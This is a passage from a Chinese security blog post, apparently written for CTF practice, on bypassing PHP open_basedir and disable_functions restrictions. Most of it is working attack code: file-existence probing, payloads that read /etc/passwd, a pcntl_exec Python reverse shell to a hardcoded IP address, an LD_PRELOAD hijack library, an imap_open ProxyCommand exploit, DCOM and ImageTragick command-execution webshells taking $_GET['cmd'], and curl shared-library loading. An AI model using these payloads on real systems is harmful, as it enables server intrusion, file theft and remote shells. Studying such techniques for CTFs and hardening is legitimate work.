+        <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;
+        <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);
+&#125;
+<span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>
+<span class="function"></span>&#123;
+        <span class="variable">$regexp</span> = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;
+        <span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$errstr</span>, <span class="variable">$matches</span>);
+        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches</span>[<span class="number">1</span>])) &#123;
+                <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="variable">$matches</span>[<span class="number">1</span>]);
+        &#125;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+<p>这里要注意dir千万不能是当前open_basedir目录及其子目录下的文件，因为他们的访问不会触发报错，也就不会被捕捉打印</p>
+<h3 id="gd库imageftbboximagefttext列举目录"><a class="markdownIt-Anchor" href="#gd库imageftbboximagefttext列举目录"></a> GD库imageftbbox/imagefttext列举目录</h3>
+<p>GD库一般是PHP必备的扩展库之一</p>
+<p>imageftbbox这个函数的第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
+<p>也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
+<span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
+<span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);
+<span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;
+<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;
+<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
+<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; 
+    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;
+    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>
+    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span>
+    <span class="title function_ invoke__">imageftbbox</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);
+&#125;
+<span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>
+<span class="function"></span>&#123;
+    <span class="keyword">global</span> <span class="variable">$file</span>;
+    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;
+        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);
+    &#125;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+<p>但是我在本地没跑出来，不知道为什么…</p>
+<h3 id="利用chdir与ini_set"><a class="markdownIt-Anchor" href="#利用chdir与ini_set"></a> 利用chdir与ini_set</h3>
+<p>chdir我已经在无参数RCE中有所提及了，将工作目录切换到指定的目录</p>
+<pre><code class="highlight plaintext">函数原型  chdir(string $directory): bool</code></pre>
+<p><code>ini_set</code>i用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为:</p>
+<pre><code class="highlight plaintext">ini_set(string $option, string $value): string|false</code></pre>
+<p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
+<p>通过在eval中传入以下payload就可以</p>
+<pre><code class="highlight plaintext">mkdir(&#x27;sub&#x27;);chdir(&#x27;sub&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);$a=file_get_contents(&#x27;/etc/passwd&#x27;);var_dump($a);</code></pre>
+<h3 id="curl绕过"><a class="markdownIt-Anchor" href="#curl绕过"></a> Curl绕过</h3>
+<pre><code class="highlight plaintext">$ch = curl_init(&#x27;file:///etc/passwd&#x27;);
+curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &quot;all&quot;);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$data = curl_exec($ch);
+echo $data;
+curl_close($ch);</code></pre>
+<p>一键打爆</p>
+<p>经过测试Apache是不行的，php-fpm可以，但是特定版本8.3，具体我也没仔细研究过</p>
+<p>参考这[题](<a target="_blank" rel="noopener" href="https://blog.kengwang.com.cn/archives/668/">LilCTF Web php-jail-is-my-cry 出题小记 - Kengwang 博客</a>)的配置吧</p>
+<h2 id="disable_function绕过"><a class="markdownIt-Anchor" href="#disable_function绕过"></a> disable_function绕过</h2>
+<p>网上找了找文章，绕法是真的多</p>
+<h3 id="亿眼盯真"><a class="markdownIt-Anchor" href="#亿眼盯真"></a> 亿眼盯真</h3>
+<p><code>phpinfo()</code>打开看看有没有遗漏的函数</p>
+<p>再命令执行</p>
+<p>可以看看有没有<code>pcntl_exec</code>这个插件</p>
+<p>有的话就能利用它RCE</p>
+<pre><code class="highlight plaintext">pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。
+
+pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。
+
+利用pcntl_exec()执行test.sh：
+
+&lt;?php
+if(function_exists(&#x27;pcntl_exec&#x27;)) &#123;
+   pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/test.sh&quot;));
+&#125; else &#123;
+       echo &#x27;pcntl extension is not support!&#x27;;
+&#125;
+?&gt;
+由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：
+
+&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;,&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));</code></pre>
+<h3 id="利用-ld_preload-环境变量"><a class="markdownIt-Anchor" href="#利用-ld_preload-环境变量"></a> 利用 LD_PRELOAD 环境变量</h3>
+<p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库</p>
+<ul>
+<li>dll = windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可</li>
+<li>so = linux 动态链接库文件</li>
+</ul>
+<p>总的来说就是=<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p>
+<p>思路为:</p>
+<ol>
+<li>创建一个.so文件,linux的动态链接库文件</li>
+<li>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</li>
+<li>利用某个函数去触发该动态链接库</li>
+</ol>
+<p>这里以<code>mail()</code>函数举例。<br>
+在底层c语言中,<code>mail.c</code>中会调用<code>sendmail</code>，而sendmail_path使从ini文件中说明</p>
+<pre><code class="highlight plaintext">; For Unix only.  You may supply arguments as well (default: &quot;sendmail -t -i&quot;). 
+;sendmail_path =</code></pre>
+<p>默认为&quot;sendmail -t -i&quot;</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini1.png" alt="phpini1"></p>
+<p>但是sendmail并不是默认安装的,需要自己下载</p>
+<p>使用命令<code>readelf -Ws /usr/sbin/sendmail</code>可以看到sendmail调用了哪些库函数,这里选择<code>geteuid</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini2.png" alt="phpini2"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini3.png" alt="phpini3"></p>
+<p>创建一个<code>test.c</code>文件,并定义一个<code>geteuid</code>函数,目的是劫持该函数。</p>
+<pre><code class="highlight plaintext">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+    system(&quot;whoami &gt; /var/tmp/sd.txt&quot;);
+&#125;
+int geteuid()
+&#123;
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+&#125;</code></pre>
+<p>使用gcc编译为.so文件</p>
+<pre><code class="highlight plaintext">gcc -fPIC -shared -o test.so test.c</code></pre>
+<p>这里有个坑:不要在windows上编译,编译出来是<code>MZ</code>头,不是<code>ELF</code>。</p>
+<p>然后再上传test.so到指定目录下。</p>
+<p>最后创建<code>shell.php</code>文件,上传到网站目录下,这里.so文件路径要写对。</p>
+<pre><code class="highlight plaintext">&lt;?php
+putenv(&quot;LD_PRELOAD=/var/www/test.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;</code></pre>
+<p>再理一下整个过程:当我们访问shell.php文件的时候,先会将<code>LD_PRELOAD</code>路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的<code>whoami</code>命令写入到sd.txt中。</p>
+<p>由于拿到的webshell很有可能是<code>www-data</code>这种普通权限。<br>
+整个过程要注意权限问题,要可写的目录下。</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini4.png" alt="phpini4"></p>
+<p>web访问页面没有文件写出,可以看看定义的目录是否有权限</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini5.png" alt="phpini5"></p>
+<p>演示图均来自这位[师傅](<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9507">bypass disable_functions姿势总结-先知社区</a>)</p>
+<h3 id="利用imap_open绕过"><a class="markdownIt-Anchor" href="#利用imap_open绕过"></a> 利用imap_open()绕过</h3>
+<p>利用条件需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code><br>
+在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。</p>
+<p>基本原理为:</p>
+<pre><code class="highlight plaintext">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</code></pre>
+<p>EXP:</p>
+<pre><code class="highlight plaintext">&lt;?php 
+error_reporting(0); 
+if (!function_exists(&#x27;imap_open&#x27;)) &#123; 
+die(&quot;no imap_open function!&quot;); 
+&#125; 
+$server = &quot;x -oProxyCommand=echot&quot; . base64_encode($_GET[&#x27;cmd&#x27;] .
+&quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64t-d|sh&#125;&quot;; 
+//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .
+&quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;; 
+imap_open(&#x27;&#123;&#x27; . $server . &#x27;:143/imap&#125;INBOX&#x27;, &#x27;&#x27;, &#x27;&#x27;); // or
+var_dump(&quot;nnError: &quot;.imap_last_error()); 
+sleep(5); 
+echo file_get_contents(&quot;/tmp/cmd_result&quot;); 
+?&gt;</code></pre>
+<h3 id="windows组件dcom绕过"><a class="markdownIt-Anchor" href="#windows组件dcom绕过"></a> Windows组件DCOM绕过</h3>
+<p>phpinfo查一下com.allow_dcom是不是打开了，开了就可以用</p>
+<p>通过已有的webshell传入</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];
+<span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span>
+<span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span>
+<span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();
+<span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();
+<span class="keyword">echo</span> <span class="variable">$stroutput</span>;
+<span class="meta">?&gt;</span></code></pre>
+<h3 id="curl-任意库加载"><a class="markdownIt-Anchor" href="#curl-任意库加载"></a> curl 任意库加载</h3>
+<p>上传恶意so文件加载共享库执行命令</p>
+<p>可以使用</p>
+<pre><code class="highlight bash">curl --engine <span class="string">&#x27;pwd&#x27;</span>/evil_engine.so https://example.com</code></pre>
+<p>或者</p>
+<pre><code class="highlight php"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSLENGINE,<span class="string">&quot;/tmp/1.so&quot;</span>);
+<span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> <span class="variable">$data</span>;
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</code></pre>
+<h3 id="蚁剑一把梭"><a class="markdownIt-Anchor" href="#蚁剑一把梭"></a> 蚁剑一把梭</h3>
+<p>会用就可以了，也不用去深度了解之类的</p>
+<h3 id="利用imagemagick-漏洞绕过cve-20163714"><a class="markdownIt-Anchor" href="#利用imagemagick-漏洞绕过cve-20163714"></a> 利用ImageMagick 漏洞绕过(CVE-2016–3714)</h3>
+<p>利用条件:</p>
+<ul>
+<li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li>
+<li>安装了php-imagick拓展并在php.ini中启用；</li>
+<li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li>
+<li>PHP &gt;= 5.4</li>
+</ul>
+<p>利用ImageTragick可以打RCE</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;
+
+<span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];
+<span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;
+    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;
+&#125;
+
+<span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span>
+<span class="string">push graphic-context</span>
+<span class="string">viewbox 0 0 640 480</span>
+<span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span>
+<span class="string">pop graphic-context</span>
+<span class="string">EOF</span>;
+
+<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);
+<span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();
+<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);
+<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);
+<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();
+<span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();
+<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);
+<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);
+<span class="meta">?&gt;</span></code></pre>
+<h3 id="backtraceuaf"><a class="markdownIt-Anchor" href="#backtraceuaf"></a> BacktraceUAF</h3>
+<p>利用条件</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP7.0 - all versions to date</li>
+<li>PHP7.1 - all versions to date</li>
+<li>PHP7.2 - all versions to date</li>
+<li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
+<li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/" rel="prev" title="原型链污染的攻击与修复">
+                  <i class="fa fa-angle-left"></i> 原型链污染的攻击与修复
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/17/Rbash%E9%80%83%E9%80%B8/" rel="next" title="Rbash逃逸">
+                  Rbash逃逸 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">332k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:03</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
